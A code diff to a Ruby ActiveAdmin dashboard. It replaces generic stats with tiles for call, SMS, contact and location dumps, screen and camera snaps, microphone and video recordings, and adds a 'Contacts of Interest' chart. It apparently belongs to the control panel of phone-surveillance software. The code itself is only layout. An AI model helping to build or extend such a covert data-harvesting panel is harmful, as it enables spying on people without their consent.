@@ -32,48 +32,50 @@ ActiveAdmin.register_page "Dashboard" do
 
 
     columns do
-        column span: 3 do
-            panel "Stats" do
-              columns do
-                  column do
-                      render partial: "statistics_image", locals: {image_path: "users.png"}
+                column span: 3 do
+                    columns do
+                  column  do 
+
+                      render partial: "calls_count", locals: {name: "CALL DUMPS", count: "132"}
                   end
                 
-                  column do
-                      render partial: "statistics_text", locals: {name: "Images", count: "132"}
-                  end
-                  column do
-                      render partial: "statistics_image", locals: {image_path: "devices.png"}
-                  end
-                
-                  column do
-                      render partial: "statistics_text", locals: {name: "Images", count: "132"}
-                  end
 
                   column do
-                      render partial: "statistics_image", locals: {image_path: "actions.png"}
+
+                      render partial: "messages_count", locals: {name: "SMS DUMPS ", count: "132"}
                   end
                 
+
+
                   column do
-                      render partial: "statistics_text", locals: {name: "Images", count: "132"}
-                  end
-                  column do
-                      render partial: "statistics_image", locals: {image_path: "something.png"}
-                  end
-                
-                  column do
-                      render partial: "statistics_text", locals: {name: "Images", count: "132"}
-                  end
+
+                      render partial: "screenshots_count", locals: {name: "SCREEN SNAPS", count: "132"}
                 end
                 
-              end
-    end
-    column do
-        panel "Activities Timeline" do
-              render partial: "timeline",    locals: {activities: activities}
+
+                column do
+            
+                    render partial: "contacts_count", locals: {name: "CONTACTS DUMPS", count: "132"}
+            end
         end
+    end
+
+    column do
+        panel "Activities" do
+
+            tabs do
+                tab :Timeline do
+                    render partial: "timeline",    locals: {activities: activities}
+                end
+                tab :Charts do
+                end
+            end
+
+        end
+
       end
-end
+    end
+
 
 
 
@@ -83,32 +85,80 @@ end
                 
 
 
+
+
+
+
+
+
         columns do
             column span: 3 do
-                panel "Locations" do
-                    render partial: "map"
+                columns do
+
+                    column do
+                
+                        render partial: "recordings_count", locals: {name: "MICROPHONE RECS", count: "132"}
                 end
+                    
+    
+                column do
+                
+                    render partial: "pictures_count", locals: {name: "CAMERA SNAPS", count: "132"}
             end
+                    
+    
             column do
-            end
+                
+                render partial: "videos_count", locals: {name: "VIDEO RECS", count: "132"}
+        end
+                    
+    
+        column do
+            
+            render partial: "locations_count", locals: {name: "LOCATION DUMPS", count: "132"}
+      end
+    end
+end
+column do
+end
+    end
+
+
+    columns do
+        column span: 2 do
+            panel "Locations" do
+                        render partial: "map"
+                end
 
         end
+        column do
+            panel "Contacts of Interest" do
+                render partial: "radar_chart", locals: {persons: ["Andrei","Alin","Mihai"]}
+            end
+        end
+
+        column do
+            
+        end
+
+    end
 
 
-        columns do
+
+        #columns do
  
-                    column do
-                    panel "Recent Pictures" do
-                        table_for Picture.order("id desc").limit(10) do
-                          column("id") { |picture| status_tag(picture.id) }
-                          column("date") { |picture| picture.date }
-                          column("filename")   { |picture| picture.filename }
-                        end
-                      end
-                  end
-                  column do
-                  end
-                end
+                #     column do
+                #     panel "Recent Pictures" do
+                #         table_for Picture.order("id desc").limit(10) do
+                #           column("id") { |picture| status_tag(picture.id) }
+                #           column("date") { |picture| picture.date }
+                #           column("filename")   { |picture| picture.filename }
+                #         end
+                #       end
+                #   end
+                #   column do
+                #   end
+                # end
 
 
     #render partial: "switch"
